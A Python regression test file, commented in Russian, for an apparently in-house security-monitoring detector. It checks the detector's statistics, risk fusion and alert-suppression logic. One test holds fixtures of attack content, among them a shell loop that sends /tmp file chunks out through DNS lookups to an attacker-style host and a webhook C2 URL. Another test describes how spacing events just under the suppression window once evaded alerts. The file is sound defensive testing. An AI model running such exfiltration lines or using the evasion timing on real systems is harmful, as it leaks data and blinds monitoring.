#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
РЕГРЕССИИ ЧИСЛЕННОГО АППАРАТА.

Каждая проверка здесь закрывает КОНКРЕТНЫЙ найденный дефект, а не «математику
вообще». Формулировка задачи в каждом блоке — что именно было сломано, чтобы
через полгода правка не вернула то же самое как «упрощение».

Эталоны берутся из закрытых форм и рекуррентных соотношений, а НЕ из scipy:
модуль stats.py намеренно на stdlib, и тест не должен требовать того, чего не
требует код. Совпадение со scipy/statsmodels/sklearn проверялось отдельно при
разборе и зафиксировано в комментариях числами.

Запуск: python tests/test_math_regressions.py
"""
import os
import sys
import math

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
os.environ.setdefault("SOC_OFFLINE", "1")

import stats                                    # noqa: E402
import detector                                 # noqa: E402
import ml_features                              # noqa: E402
import taxonomy                                 # noqa: E402

FAILED = []


def check(name, ok, detail=""):
    print(("  OK    " if ok else "  ПЛОХО ") + name + (("  " + detail) if detail and not ok else ""))
    if not ok:
        FAILED.append(name)


# ======================================================================
def test_poisson_tail_precision():
    """P(X ≥ c) не должна упираться в пол при c >> λ.

    Было: хвост считался как 1 − CDF. Для c, заметно больших λ, CDF отличается
    от единицы меньше машинного эпсилона, разность обнулялась, и результат
    зажимался на 1e-12 — потолок ровно 39.86 бит. Всплеск в 20 событий и
    всплеск в 30 получали ОДИН И ТОТ ЖЕ скор.

    Эталон — рекуррентное суммирование хвоста в лог-пространстве, независимое
    от реализации в detector.py.
    """
    print("\n-- пуассоновский хвост --")

    def ref_sf(c, lam):
        """Σ_{k≥c} e^{−λ}λ^k/k! суммированием от старшего члена (без вычитания)."""
        if c <= 0:
            return 1.0
        log_t = -lam + c * math.log(lam) - math.lgamma(c + 1.0)
        t = math.exp(log_t)
        acc, k = t, c
        while t > acc * 1e-18 and k < c + 20000:
            t *= lam / (k + 1.0)
            acc += t
            k += 1
        return acc

    worst = 0.0
    for lam in (0.05, 0.5, 1.0, 2.0, 3.0, 10.0, 50.0):
        for c in list(range(1, 70)) + [120, 250]:
            ours = detector._poisson_sf(c, lam)
            if c <= lam:
                continue                        # левая часть считается иначе
            r = ref_sf(c, lam)
            if r > 1e-300:
                worst = max(worst, abs(ours - r) / r)
    check("хвост совпадает с прямым суммированием (отн. погрешность < 1e-10)",
          worst < 1e-10, f"худшая: {worst:.2e}")

    # именно то, что было сломано: разные всплески — разные числа
    b20 = -math.log2(detector._poisson_sf(20, 1.0))
    b30 = -math.log2(detector._poisson_sf(30, 1.0))
    check("всплеск 20 и всплеск 30 различимы (раньше оба 39.86 бит)",
          b30 - b20 > 40.0, f"20 -> {b20:.1f} бит, 30 -> {b30:.1f} бит")
    check("значения соответствуют точным (62.45 и 109.10 бит)",
          abs(b20 - 62.45) < 0.01 and abs(b30 - 109.10) < 0.01,
          f"{b20:.2f} / {b30:.2f}")

    # монотонность: чем больше всплеск, тем меньше вероятность
    prev, mono = 1.0, True
    for c in range(1, 80):
        v = detector._poisson_sf(c, 3.0)
        if v > prev + 1e-18:
            mono = False
        prev = v
    check("P(X ≥ c) не возрастает по c", mono)


def test_surprisal_floor():
    """Пол −log2(p) не должен быть достижим в обычной работе.

    Было: max(p, 1e-12) — потолок 39.86 бит, то есть ровно там, куда попадают
    настоящие всплески. Пол нужен только против p == 0.
    """
    print("\n-- неожиданность в битах --")
    check("surprisal(0) конечен", math.isfinite(detector._surprisal(0.0)))
    check("пол выше 1000 бит, а не 40",
          detector._surprisal(0.0) > 1000.0,
          f"{detector._surprisal(0.0):.1f}")
    check("1e-33 даёт ~109.6 бит, а не обрезается",
          abs(detector._surprisal(1e-33) - 109.62) < 0.01,
          f"{detector._surprisal(1e-33):.2f}")


def test_distributions_normalised():
    """Плотности обязаны суммироваться в единицу — иначе «биты» не биты."""
    print("\n-- нормировка распределений --")
    for hist in ([9, 10, 11], [23, 0, 1, 2], [14] * 50, []):
        v = detector._VonMisesHours()
        for h in hist:
            v.update(h)
        tot = sum(v.prob(h) for h in range(24))
        check(f"фон Мизес: Σp = 1 (история {len(hist)} набл.)", abs(tot - 1.0) < 1e-9,
              f"{tot:.12f}")

    v = detector._VonMisesHours()
    for _ in range(50):
        v.update(0)
    check("час цикличен: p(1) == p(23) при истории в полночь",
          abs(v.prob(1) - v.prob(23)) < 1e-12)
    check("час цикличен: соседи полуночи вероятнее полудня",
          v.prob(1) > 5 * v.prob(12))

    c = detector._Categorical()
    for x in ["a"] * 10 + ["b"] * 3 + ["c"]:
        c.update(x)
    vocab = {"a", "b", "c", "d", "e"}
    tot = sum(c.prob(x, vocab) for x in vocab)
    check("Дирихле: Σp по словарю = 1", abs(tot - 1.0) < 1e-12, f"{tot:.12f}")
    check("невиданное значение получает ненулевую вероятность",
          c.prob("e", vocab) > 0)


def test_wilson_exact_quantile():
    """Интервал Уилсона считается по точному квантилю, а не по 1.96.

    Эталон — значения statsmodels.proportion_confint(method='wilson'),
    зафиксированные числом: 41/55 -> [0.6169812871823414, 0.8418788522692710].
    """
    print("\n-- интервал Уилсона --")
    check("квантиль точный, а не 1.96",
          abs(stats.Z95 - 1.959963984540054) < 1e-15, f"{stats.Z95!r}")
    lo, hi = stats.wilson(41, 55)
    check("41/55 совпадает с эталоном statsmodels",
          abs(lo - 0.6169812871823414) < 1e-12 and abs(hi - 0.8418788522692710) < 1e-12,
          f"[{lo:.10f}, {hi:.10f}]")
    lo, hi = stats.wilson(0, 20)
    check("вырожденный случай 0/20 не выходит за [0,1]", lo == 0.0 and hi < 1.0)
    lo, hi = stats.wilson(20, 20)
    check("вырожденный случай 20/20 не выходит за [0,1]", hi == 1.0 and lo > 0.0)


def test_pr_auc_ties():
    """PR-AUC на связках: эталон — average precision по определению."""
    print("\n-- PR-AUC --")
    pos, neg = [1, 1, 1, 2, 2], [1, 1, 2, 3, 3, 3]
    check("совпадает с sklearn.average_precision_score (0.40606061)",
          abs(stats.pr_auc(pos, neg) - 0.4060606060606061) < 1e-12,
          f"{stats.pr_auc(pos, neg):.10f}")
    check("ROC-AUC на связках совпадает с sklearn (0.26666667)",
          abs(stats.roc_auc(pos, neg) - 0.26666666666666666) < 1e-12)
    check("база PR-AUC = доля класса", abs(stats.baseline_pr(5, 95) - 0.05) < 1e-12)


def test_fusion_monotone():
    """Согласие слоёв не может понижать риск.

    Историческая ошибка: складывались апостериорные лог-шансы без вычитания
    приора, поэтому приор входил n раз, и КАЖДЫЙ дополнительный слой тянул
    риск вниз — правило 0.70 плюс подтверждение модели давали 0.30.
    """
    print("\n-- слияние рисков --")
    one = detector.fuse([{"risk": 0.70}])
    two = detector.fuse([{"risk": 0.70}, {"risk": 0.55}])
    three = detector.fuse([{"risk": 0.70}, {"risk": 0.55}, {"risk": 0.50}])
    check("второй согласный слой не понижает риск", two >= one, f"{one} -> {two}")
    check("третий согласный слой не понижает риск", three >= two, f"{two} -> {three}")
    check("риск остаётся в [0,1]", all(0.0 <= x <= 1.0 for x in (one, two, three)))
    check("пустой список -> 0", detector.fuse([]) == 0.0)



def test_attack_content_not_self_suppressing():
    """Содержимое, которое пишет атака, не должно помечать себя безобидным.

    `placeholder_signal` означает «похоже на секрет, но это шаблон» и служит
    ГАСИТЕЛЕМ: восемь правил требуют `placeholder_signal: false`, а слой L2
    получает его отдельным признаком.

    RFC 2606 резервирует зону `.example` под документацию, поэтому слово
    «example» стоит в списке маркеров шаблона. И ровно в этой зоне жила вся
    инфраструктура атакующего: hook.attacker-cdn.example, exfil.attacker-dns.example,
    mail-relay.example, pkgs.internal.example. Содержимое ЧЕТЫРЁХ шагов атаки
    из четырёх само себя объявляло шаблоном.

    Проверяется по существу: берём реальные фрагменты содержимого шагов и
    требуем placeholder_signal=false, а у benign-двойников — true (иначе
    «починить» тест можно было бы, просто выкинув маркеры из регулярки).
    """
    import content_features as cf
    import content.secrets_bank as sb

    print("\n-- содержимое атак не глушит само себя --")

    attack = {
        "webhook C2 (T1102)":
            "url: https://hook.attacker-cdn.io/ingest\nevents: push,merge_request\n",
        "выгрузка по DNS (T1048)":
            "for f in /tmp/chunk_*; do dig +short $(cat $f).exfil.attacker-dns.net; done\n",
        "пересылка почты":
            "      forward_to: archive.backup@mail-relay.io\n      keep_copy: false\n",
        "индекс пакетов (T1195.002)":
            sb.package_index_manifest()["content"],
    }
    for name, content in attack.items():
        f = cf.analyze(content, "config/x.yml")
        hit = cf._PLACEHOLDER_RE.search(content)
        check(f"{name}: не помечен шаблоном",
              not f["placeholder_signal"],
              f"сработало на {hit.group(0)!r}" if hit else "")

    # Обратная сторона: маркеры шаблона обязаны продолжать работать на норме,
    # иначе benign-двойники перестанут быть двойниками.
    for name, fn in (("env.example", sb.benign_env_example),
                     ("тестовая фикстура", sb.benign_test_key)):
        _, content = fn()
        check(f"benign-двойник «{name}» по-прежнему помечен шаблоном",
              cf.analyze(content, ".env.example")["placeholder_signal"])

    # Ни один шаг атаки не должен использовать зарезервированную зону .example.
    import glob
    import re as _re
    bad = []
    for path in glob.glob("activities/*.py") + glob.glob("content/*.py"):
        src = open(path, encoding="utf-8").read()
        for m in _re.finditer(r"attacker[\w.-]*\.example|exfil[\w.-]*\.example"
                              r"|pkgs[\w.-]*\.example|mail-relay\.example", src):
            bad.append(f"{path}:{src.count(chr(10), 0, m.start()) + 1} {m.group(0)}")
    check("инфраструктура атакующего не живёт в зоне .example", not bad, "; ".join(bad[:4]))



def test_secretdir_not_triggered_by_team_work():
    """Каталог секретов — это КАТАЛОГ, а не слово в имени файла.

    На живом стенде признак path_secretdir считался как «одно из слов
    (vault/backup/export/secret/dump/credential) встречается ГДЕ-ЛИБО в пути».
    Команда SOC весь день пишет правила про кражу учётных данных, поэтому под
    признак попадало ровно то, что является её нормальной работой:

        rules/credential_access/golden_ticket_anomalous_tgt.yml
        rules/defender/defender-credential-file-access.yml
        playbooks/ir_credential_theft.md

    Из 50 алертов живого прогона 46 были такими: очередь аналитика забита
    нормальной работой, а перекос слоёв (модель 92%, правила 6%) выглядел как
    «модель сильна», хотя означал «модель реагирует на слово в имени файла».

    После правки PR-AUC вырос с 0.249 до 0.329 при базе 0.031 — то есть
    признак не просто шумел, он ухудшал модель.
    """
    import ml_features as mf
    import content_features as cf

    print("\n-- каталог секретов против работы команды --")
    i = mf.FEATURES.index("path_secretdir")

    def secretdir(path):
        ev = dict(path=path, action="push", has_content=1, bytes=900)
        ev.update(cf.analyze("rule: detect credential dumping\n", path))
        return mf.featurize(ev)[i]

    team = ["rules/credential_access/golden_ticket_anomalous_tgt.yml",
            "rules/defender/defender-credential-file-access.yml",
            "playbooks/ir_credential_theft.md",
            "rules/win/lsass_credential_dump.yml"]
    for p_ in team:
        check(f"работа команды не считается каталогом секретов: {p_.split('/')[-1]}",
              secretdir(p_) == 0.0)

    real = ["vault/prod-secrets.yml", "backup/db_export.sql",
            "secrets/api.env", "dumps/users.sql"]
    for p_ in real:
        check(f"настоящий каталог секретов распознан: {p_}", secretdir(p_) == 1.0)

    check("обычный код не задет", secretdir("src/app.py") == 0.0)



def test_suppression_window_expires():
    """Окно подавления дублей обязано ИСТЕКАТЬ.

    Отметка времени двигалась при каждом вызове, включая подавленные, поэтому
    окно было скользящим и не закрывалось никогда. Чтобы стать невидимым для
    правила, достаточно было выдерживать паузу чуть меньше окна:

        раз в 30 минут при окне 60:  17 событий -> 1 алерт
        раз в 59 минут при окне 60:  24 события -> 1 алерт (сутки молчания)

    Это дыра в обнаружении, а не косметика: профили уклонения stealthy и
    adaptive в этом стенде именно растягивают шаги кампании во времени.
    """
    from datetime import datetime, timedelta
    print("\n-- окно подавления дублей --")
    t0 = datetime(2026, 8, 18, 10, 0, 0)

    def run(step_min, n, window=60):
        s = detector.Suppressor(window_min=window)
        return sum(1 for i in range(n)
                   if not s.is_duplicate("a", "r", t0 + timedelta(minutes=step_min * i)))

    check("раз в 30 мин при окне 60 даёт больше одного алерта",
          run(30, 17) >= 5, f"алертов: {run(30, 17)}")
    check("раз в 59 мин сутки подряд не молчит",
          run(59, 24) >= 10, f"алертов: {run(59, 24)}")
    check("реже окна — подавления нет вовсе", run(90, 10) == 10, f"алертов: {run(90, 10)}")

    s = detector.Suppressor(window_min=60)
    check("первое срабатывание проходит", not s.is_duplicate("a", "r", t0))
    check("повтор внутри окна подавлен",
          s.is_duplicate("a", "r", t0 + timedelta(minutes=30)))
    check("после истечения окна снова проходит",
          not s.is_duplicate("a", "r", t0 + timedelta(minutes=61)))
    check("другой актор не подавляется",
          not s.is_duplicate("b", "r", t0 + timedelta(minutes=1)))
    check("другое правило не подавляется",
          not s.is_duplicate("a", "r2", t0 + timedelta(minutes=1)))


def test_feature_vocabulary_sync():
    """Словарь действий и вектор признаков не могут разойтись.

    Дважды расходились: сначала на issue_* (3 действия), потом на 24 действия
    сразу — модель перестала различать больше половины словаря, всё уходило в
    act_unknown. Теперь ACTIONS выводится из taxonomy.OBSERVABLE.
    """
    print("\n-- синхронность словаря и признаков --")
    missing, extra = ml_features.check_taxonomy()
    check("ACTIONS покрывает taxonomy.OBSERVABLE", not missing, str(missing[:8]))
    check("в ACTIONS нет действий вне словаря", not extra, str(extra[:8]))
    check("длина вектора совпадает с FEATURES",
          len(ml_features.featurize({})) == len(ml_features.FEATURES))
    check("порядок ACTIONS детерминирован (sorted)",
          ml_features.ACTIONS == sorted(ml_features.ACTIONS))

    n = len(ml_features.ACTIONS)
    check(f"каждое из {n} действий имеет свой признак",
          all(("act_" + a) in ml_features.FEATURES for a in ml_features.ACTIONS))

    # действие из словаря НЕ должно помечаться как неизвестное
    idx = ml_features.FEATURES.index("act_unknown")
    known = ml_features.featurize({"action": sorted(taxonomy.OBSERVABLE)[0]})
    unknown = ml_features.featurize({"action": "не-существующее-действие"})
    check("известное действие не попадает в act_unknown", known[idx] == 0.0)
    check("неизвестное действие помечается act_unknown", unknown[idx] == 1.0)


def main():
    print("=" * 70)
    print("  РЕГРЕССИИ ЧИСЛЕННОГО АППАРАТА")
    print("=" * 70)
    test_poisson_tail_precision()
    test_surprisal_floor()
    test_distributions_normalised()
    test_wilson_exact_quantile()
    test_pr_auc_ties()
    test_fusion_monotone()
    test_attack_content_not_self_suppressing()
    test_secretdir_not_triggered_by_team_work()
    test_suppression_window_expires()
    test_feature_vocabulary_sync()
    print("-" * 70)
    if FAILED:
        print(f"  ПРОВАЛЕНО: {len(FAILED)}")
        for f in FAILED:
            print("     -", f)
        return 1
    print("  Численный аппарат корректен.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
